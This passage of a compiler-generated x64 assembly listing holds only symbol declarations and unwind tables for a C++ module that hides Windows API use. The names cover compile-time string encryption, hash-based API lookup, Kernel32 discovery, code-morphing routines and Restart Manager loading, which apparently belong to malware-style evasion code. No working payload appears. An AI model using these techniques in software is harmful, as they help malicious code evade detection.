PUBLIC	?decrypt@?$MetaBuffer@$0GL@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z ; MetaBuffer<107,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
PUBLIC	??0?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BB@$0DP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<17,63,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z ; MetaBuffer<43,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12> >::decrypt
PUBLIC	??0?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CJ@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<41,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
PUBLIC	__JustMyCode_Default
PUBLIC	??_C@_1BK@EJBALEBG@?$AAK?$AAe?$AAr?$AAn?$AAe?$AAl?$AA3?$AA2?$AA?4?$AAd?$AAl?$AAl@ ; `string'
PUBLIC	??_C@_0N@DOHINHCI@Advapi32?4dll@		; `string'
PUBLIC	??_C@_0N@HAOHNMDE@Kernel32?4dll@		; `string'
PUBLIC	??_C@_0N@NKMBPHLD@Netapi32?4dll@		; `string'
PUBLIC	??_C@_0N@KCFEDKNO@Iphlpapi?4dll@		; `string'
PUBLIC	??_C@_0N@NKKEACFL@Rstrtmgr?4dll@		; `string'
PUBLIC	??_C@_0L@EANHMAHB@ws2_32?4dll@			; `string'
PUBLIC	??_C@_0L@OKGHKNFP@User32?4dll@			; `string'
PUBLIC	??_C@_0M@OHCDEFLB@Shlwapi?4dll@			; `string'
PUBLIC	??_C@_0M@LNAMDANG@Shell32?4dll@			; `string'
PUBLIC	??_C@_09MDJBOJHM@Ole32?4dll@			; `string'
PUBLIC	??_C@_0N@BHPCGNMJ@OleAut32?4dll@		; `string'
PUBLIC	??_C@_09FLKFJBLM@ntdll?4dll@			; `string'
EXTRN	__report_rangecheckfailure:PROC
EXTRN	memcpy:PROC
EXTRN	strcat:PROC
EXTRN	malloc:PROC
EXTRN	?MurmurHash2A@@YAIPEBXHI@Z:PROC			; MurmurHash2A
EXTRN	_RTC_CheckStackVars:PROC
EXTRN	_RTC_InitBase:PROC
EXTRN	_RTC_Shutdown:PROC
EXTRN	_RTC_UninitUse:PROC
EXTRN	__CheckForDebuggerJustMyCode:PROC
EXTRN	__GSHandlerCheck:PROC
EXTRN	__security_check_cookie:PROC
EXTRN	__ImageBase:BYTE
EXTRN	__security_cookie:QWORD
;	COMDAT pdata
pdata	SEGMENT
$pdata$RtlSecureZeroMemory DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$RtlSecureZeroMemory
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?InitializeGetapiModule@getapi@@YAHXZ DD imagerel $LN5
	DD	imagerel $LN5+251
	DD	imagerel $unwind$?InitializeGetapiModule@getapi@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?IsRestartManagerLoaded@getapi@@YAHXZ DD imagerel $LN3
	DD	imagerel $LN3+43
	DD	imagerel $unwind$?IsRestartManagerLoaded@getapi@@YAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?SetRestartManagerLoaded@getapi@@YAXH@Z DD imagerel $LN3
	DD	imagerel $LN3+52
	DD	imagerel $unwind$?SetRestartManagerLoaded@getapi@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z DD imagerel $LN23
	DD	imagerel $LN23+1044
	DD	imagerel $unwind$?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z DD imagerel $LN4
	DD	imagerel $LN4+165
	DD	imagerel $unwind$?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?positive_modulo@@YAHHH@Z DD imagerel $LN3
	DD	imagerel $LN3+74
	DD	imagerel $unwind$?positive_modulo@@YAHHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?morphcode@@YAXH@Z DD imagerel $LN22
	DD	imagerel $LN22+367
	DD	imagerel $unwind$?morphcode@@YAXH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?morphcode@@YAXPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+52
	DD	imagerel $unwind$?morphcode@@YAXPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?StrLen@@YAHPEBD@Z DD imagerel $LN5
	DD	imagerel $LN5+92
	DD	imagerel $unwind$?StrLen@@YAHPEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?StrLen@@YAHPEB_W@Z DD imagerel $LN5
	DD	imagerel $LN5+93
	DD	imagerel $unwind$?StrLen@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?m_memcpy@@YAXPEAXQEAX_K@Z DD imagerel $LN8
	DD	imagerel $LN8+308
	DD	imagerel $unwind$?m_memcpy@@YAXPEAXQEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?FindChar@@YAPEADPEADD@Z DD imagerel $LN6
	DD	imagerel $LN6+110
	DD	imagerel $unwind$?FindChar@@YAPEADPEADD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?my_stoi@@YAHPEAD@Z DD imagerel $LN17
	DD	imagerel $LN17+375
	DD	imagerel $unwind$?my_stoi@@YAHPEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetForvardedProc@@YAPEAXPEAD@Z DD imagerel $LN6
	DD	imagerel $LN6+589
	DD	imagerel $unwind$?GetForvardedProc@@YAPEAXPEAD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CheckForForvardedProc@@YAH_KPEAU_IMAGE_EXPORT_DIRECTORY@@K@Z DD imagerel $LN5
	DD	imagerel $LN5+130
	DD	imagerel $unwind$?CheckForForvardedProc@@YAH_KPEAU_IMAGE_EXPORT_DIRECTORY@@K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetFunctionAddresss@@YA_KPEAUHINSTANCE__@@PEAU_IMAGE_EXPORT_DIRECTORY@@J@Z DD imagerel $LN3
	DD	imagerel $LN3+144
	DD	imagerel $unwind$?GetFunctionAddresss@@YA_KPEAUHINSTANCE__@@PEAU_IMAGE_EXPORT_DIRECTORY@@J@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?ReturnAddress@@YAXPEAKK@Z DD imagerel $LN3
	DD	imagerel $LN3+209
	DD	imagerel $unwind$?ReturnAddress@@YAXPEAKK@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?FindFunction@@YAHPEAUHINSTANCE__@@KPEAU_IMAGE_EXPORT_DIRECTORY@@@Z DD imagerel $LN9
	DD	imagerel $LN9+379
	DD	imagerel $unwind$?FindFunction@@YAHPEAUHINSTANCE__@@KPEAU_IMAGE_EXPORT_DIRECTORY@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z DD imagerel $LN12
	DD	imagerel $LN12+599
	DD	imagerel $unwind$?GetApiAddr@@YA_KPEAUHINSTANCE__@@KPEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetHashBase@@YAKPEAULDR_MODULE@@@Z DD imagerel $LN7
	DD	imagerel $LN7+306
	DD	imagerel $unwind$?GetHashBase@@YAKPEAULDR_MODULE@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?GetKernel32@@YAPEAUHINSTANCE__@@XZ DD imagerel $LN8
	DD	imagerel $LN8+343
	DD	imagerel $unwind$?GetKernel32@@YAPEAUHINSTANCE__@@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1172
	DD	imagerel $unwind$??0?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+67
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+69
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BB@$00U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+626
	DD	imagerel $unwind$??0?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$06$0GM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+626
	DD	imagerel $unwind$??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+626
	DD	imagerel $unwind$??0?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BN@$0EG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+626
	DD	imagerel $unwind$??0?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0ED@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+626
	DD	imagerel $unwind$??0?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GF@$0DM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+542
	DD	imagerel $unwind$??0?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
